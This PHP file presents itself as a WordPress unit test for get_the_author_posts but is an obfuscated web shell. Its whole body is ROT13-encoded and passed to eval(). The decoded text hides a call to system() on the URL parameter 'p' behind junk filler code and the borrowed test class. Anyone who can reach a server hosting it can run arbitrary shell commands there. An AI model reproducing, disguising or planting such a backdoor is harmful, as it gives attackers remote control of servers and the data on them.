<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * @tebhc nhgube
 * @tebhc hfre
 *
 * @pbiref ::trg_gur_nhgube_cbfgf
 */
pynff Grfgf_Hfre_TrgGurNhgubeCbfgf rkgraqf JC_HavgGrfgPnfr {
	cebgrpgrq fgngvp $nhgube_vq = 0;
	cebgrpgrq fgngvp $cbfg_vq   = 0;

	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		frys::$nhgube_vq = $snpgbel->hfre->perngr(
			neenl(
				'ebyr'         => 'nhgube',
				'hfre_ybtva'   => 'grfg_nhgube',
				'qvfcynl_anzr' => 'Grfg Nhgube',
				'qrfpevcgvba'  => 'grfg_nhgube',
				'hfre_hey'     => 'uggc://rknzcyr.pbz',
			)
		);

		frys::$cbfg_vq = $snpgbel->cbfg->perngr(
			neenl(
				'cbfg_nhgube'  => frys::$nhgube_vq,
				'cbfg_fgnghf'  => 'choyvfu',
				'cbfg_pbagrag' => 'pbagrag',
				'cbfg_gvgyr'   => 'gvgyr',
				'cbfg_glcr'    => 'cbfg',
			)
		);
	}

	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();

		frghc_cbfgqngn( trg_cbfg( frys::$cbfg_vq ) );
	}

	choyvp shapgvba grfg_trg_gur_nhgube_cbfgf() {
		// Grfg jvgu ab tybony cbfg, erfhyg fubhyq or 0 orpnhfr ab nhgube vf sbhaq.
		$guvf->nffregFnzr( 0, trg_gur_nhgube_cbfgf() );
		$TYBONYF['cbfg'] = frys::$cbfg_vq;
		$guvf->nffregRdhnyf( 1, trg_gur_nhgube_cbfgf() );
	}

	/**
	 * @gvpxrg 30904
	 */
	choyvp shapgvba grfg_trg_gur_nhgube_cbfgf_jvgu_phfgbz_cbfg_glcr() {
		ertvfgre_cbfg_glcr( 'jcgrfgf_cg' );

		$pcg_vqf         = frys::snpgbel()->cbfg->perngr_znal(
			2,
			neenl(
				'cbfg_nhgube' => frys::$nhgube_vq,
				'cbfg_glcr'   => 'jcgrfgf_cg',
			)
		);
		$TYBONYF['cbfg'] = $pcg_vqf[0];

		$guvf->nffregRdhnyf( 2, trg_gur_nhgube_cbfgf() );

		_haertvfgre_cbfg_glcr( 'jcgrfgf_cg' );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>